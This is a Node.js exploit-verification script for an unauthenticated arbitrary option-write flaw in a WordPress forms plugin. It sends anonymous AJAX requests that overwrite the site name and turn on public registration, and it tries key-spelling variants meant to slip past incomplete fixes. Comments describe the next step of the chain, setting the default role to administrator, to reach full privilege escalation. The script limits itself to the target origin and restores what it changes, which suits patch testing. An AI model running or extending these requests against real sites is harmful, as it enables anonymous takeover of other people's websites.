#!/usr/bin/env node
// probe.mjs - exploit-verification probe for Old Forms <= 1.4.2 (CVE-2026-90003).
//
// Bug class: the unauthenticated `of_save_field` AJAX action (wp_ajax_nopriv_of_save_field)
// passes a user-supplied `key` straight into update_option() with no capability check and
// no key allow-list. Any option can be written by an anonymous client.
//
// Usage:   node probe.mjs <base-url>        e.g. node probe.mjs http://127.0.0.1:8188
// Exit:    0 = VULNERABLE (at least one attack variant succeeded)
//          1 = NOT VULNERABLE (every variant failed; behaves as fixed)
//          2 = INDETERMINATE (usage error, target unreachable, or no read-back channel)
//
// Verification never trusts the AJAX response (the plugin returns success regardless).
// It reads state back through public surfaces:
//   - site name:            GET <root>/index.php?rest_route=/   (JSON "name", from blogname)
//   - registration enabled: GET <root>/wp-login.php?action=register (200 + #registerform
//                           only when users_can_register is truthy; otherwise 302)
// State changed during a probe is restored best-effort (blogname, users_can_register).
// Only the base URL's origin is contacted. No filesystem writes.

import { randomBytes } from 'node:crypto';

const EXIT_VULNERABLE = 0;
const EXIT_FIXED = 1;
const EXIT_INDETERMINATE = 2;

if (process.argv.length !== 3) {
	console.error('usage: node probe.mjs <base-url>');
	process.exit(EXIT_INDETERMINATE);
}

let base;
try {
	base = new URL(process.argv[2]);
} catch {
	console.error(`invalid base URL: ${process.argv[2]}`);
	process.exit(EXIT_INDETERMINATE);
}
if (base.protocol !== 'http:' && base.protocol !== 'https:') {
	console.error('base URL must be http or https');
	process.exit(EXIT_INDETERMINATE);
}

// Every request is built from this root, so nothing leaves the target origin.
const ROOT = base.origin + base.pathname.replace(/\/+$/, '');
const AJAX_URL = `${ROOT}/wp-admin/admin-ajax.php`;
const REST_ROOT_URL = `${ROOT}/index.php?rest_route=/`;
const REGISTER_URL = `${ROOT}/wp-login.php?action=register`;

async function http(url, init = {}) {
	const res = await fetch(url, {
		redirect: 'manual',
		signal: AbortSignal.timeout(15000),
		...init,
	});
	return { status: res.status, text: await res.text() };
}

// Send one unauthenticated request to of_save_field.
// `multipart` selects a multipart/form-data body instead of urlencoded (same $_POST result).
async function saveField(key, value, multipart = false) {
	let body;
	if (multipart) {
		body = new FormData();
		body.append('action', 'of_save_field');
		body.append('key', key);
		body.append('value', value);
	} else {
		body = new URLSearchParams({ action: 'of_save_field', key, value });
	}
	return http(AJAX_URL, { method: 'POST', body });
}

// Read blogname through the public REST root. Returns null if unreadable.
async function readSiteName() {
	try {
		const r = await http(REST_ROOT_URL);
		if (r.status !== 200) return null;
		const j = JSON.parse(r.text);
		return typeof j.name === 'string' ? j.name : null;
	} catch {
		return null;
	}
}

// True when public user registration is enabled (users_can_register truthy).
async function registrationOpen() {
	const r = await http(REGISTER_URL);
	return r.status === 200 && /id=["']registerform["']/.test(r.text);
}

function newMarker() {
	// Hex token: no words a keyword filter would be tuned to block.
	return 'canary-' + randomBytes(8).toString('hex');
}

// Key-spelling variants that reach update_option() after sanitize_key()/wp_unslash().
// A fix that only matches the literal "blogname" string may miss these.
const NAME_VARIANTS = [
	{ label: 'plain key', key: 'blogname' },
	{ label: 'uppercase key (sanitize_key lowercases)', key: 'BLOGNAME' },
	{ label: 'padded key (whitespace stripped by sanitize_key)', key: ' blogname\t' },
	{ label: 'backslash-split key (wp_unslash removes the backslash)', key: 'blog\\name' },
	{ label: 'plain key, multipart transport', key: 'blogname', multipart: true },
];

// Registration-enable chain: enabling registration is the first step of the privilege
// escalation (then default_role is set to administrator). default_role itself is not
// written here, because its original value cannot be read back unauthenticated.
const REG_VARIANTS = [
	{ label: 'users_can_register=1', key: 'users_can_register', value: '1' },
	{ label: 'uppercase key USERS_CAN_REGISTER', key: 'USERS_CAN_REGISTER', value: '1' },
	{ label: 'truthy non-numeric value "on"', key: 'users_can_register', value: 'on' },
	{ label: 'users_can_register=1, multipart transport', key: 'users_can_register', value: '1', multipart: true },
];

async function main() {
	const originalName = await readSiteName();
	const regAlreadyOpen = await registrationOpen();

	console.log(`target root: ${ROOT}`);
	console.log(`baseline: site name ${originalName === null ? '(unreadable)' : JSON.stringify(originalName)}, ` +
		`registration ${regAlreadyOpen ? 'OPEN' : 'closed'}`);

	if (originalName === null && regAlreadyOpen) {
		console.error('indeterminate: no read-back channel usable (site name unreadable and registration already open)');
		return EXIT_INDETERMINATE;
	}

	let vulnerable = false;
	let evidence = '';

	// Phase 1: arbitrary option write, verified by reading blogname back from REST.
	if (originalName !== null) {
		for (const v of NAME_VARIANTS) {
			const marker = newMarker();
			const w = await saveField(v.key, marker, v.multipart);
			const now = await readSiteName();
			const written = now === marker;
			console.log(`[name] ${v.label}: HTTP ${w.status} -> ${written ? 'WRITTEN (read-back matches)' : 'not written'}`);

			if (written) {
				vulnerable = true;
				evidence = `arbitrary option write confirmed via ${v.label}`;
				// Restore using the same key spelling that worked; fall back to plain key.
				await saveField(v.key, originalName, v.multipart);
				if ((await readSiteName()) !== originalName) {
					await saveField('blogname', originalName);
				}
				console.log(`[name] restored blogname to ${JSON.stringify(originalName)}: ${(await readSiteName()) === originalName ? 'ok' : 'WARNING: restore failed'}`);
				break;
			}
		}
	}

	// Phase 2: enable public registration (escalation chain step).
	if (!vulnerable) {
		if (regAlreadyOpen) {
			console.log('[reg] registration already open at baseline; chain check skipped (cannot tell whether the write worked)');
		} else {
			for (const v of REG_VARIANTS) {
				const w = await saveField(v.key, v.value, v.multipart);
				const open = await registrationOpen();
				console.log(`[reg] ${v.label}: HTTP ${w.status} -> ${open ? 'REGISTRATION ENABLED' : 'not enabled'}`);

				if (open) {
					vulnerable = true;
					evidence = `registration enabled via ${v.label}`;
					// Restore: disable registration again.
					await saveField(v.key, '0', v.multipart);
					if (await registrationOpen()) {
						await saveField('users_can_register', '0');
					}
					console.log(`[reg] restored users_can_register to 0: ${(await registrationOpen()) ? 'WARNING: still open' : 'ok'}`);
					break;
				}
			}
		}
	}

	if (vulnerable) {
		console.log(`RESULT: VULNERABLE - ${evidence}`);
		return EXIT_VULNERABLE;
	}
	if (originalName === null) {
		// Only the registration chain was testable, and it had a closed baseline; a negative
		// there is still a real negative, so report it as fixed rather than indeterminate.
		console.log('RESULT: NOT VULNERABLE (name read-back unavailable; registration chain did not succeed)');
		return EXIT_FIXED;
	}
	console.log('RESULT: NOT VULNERABLE - no attack variant changed the target state');
	return EXIT_FIXED;
}

main()
	.then((code) => process.exit(code))
	.catch((err) => {
		console.error(`indeterminate: ${err && err.message ? err.message : err}`);
		process.exit(EXIT_INDETERMINATE);
	});
